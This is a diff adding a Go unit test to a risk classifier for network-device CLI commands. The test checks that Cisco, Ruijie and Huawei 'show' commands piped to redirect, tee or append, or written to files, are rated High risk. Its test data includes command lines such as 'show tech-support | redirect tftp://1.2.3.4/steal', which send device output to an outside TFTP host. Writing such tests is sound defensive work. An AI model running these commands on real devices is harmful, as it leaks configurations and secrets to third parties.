@@ -92,6 +92,34 @@ func TestPlatformTableAndNames(t *testing.T) {
 	}
 }
 
+// A read-only command that pipes its output away is a write, not a check.
+func TestClassifyRefusesPipeWritesOnReadOnlyCommands(t *testing.T) {
+	for _, test := range []struct{ platform, command string }{
+		{"cisco_ios", "show tech-support | redirect tftp://1.2.3.4/steal"},
+		{"cisco_ios", "show version | tee tftp://10.0.0.1/v"},
+		{"cisco_ios", "show clock | append flash:notes"},
+		{"cisco_ios", "show log > flash:log.txt"},
+		{"ruijie_rgos", "show running-config | include hostname | redirect tftp://1.1.1.1/c"},
+		{"huawei_vrp", "display version > vrf.txt"},
+		{"generic", "show version | redirect tftp://2.2.2.2/v"},
+	} {
+		assessment := Classify(test.platform, test.command)
+		if assessment.Level < risk.High {
+			t.Errorf("%s %q = %v; want at least High", test.platform, test.command, assessment.Level)
+		}
+	}
+	// Plain filters stay read-only.
+	for _, test := range []struct{ platform, command string }{
+		{"cisco_ios", "show version | include Version"},
+		{"cisco_ios", "show version | section header"},
+		{"huawei_vrp", "display clock"},
+	} {
+		if assessment := Classify(test.platform, test.command); assessment.Level != risk.Low {
+			t.Errorf("%s %q = %v; want Low", test.platform, test.command, assessment.Level)
+		}
+	}
+}
+
 func TestClassify(t *testing.T) {
 	tests := []struct {
 		name       string
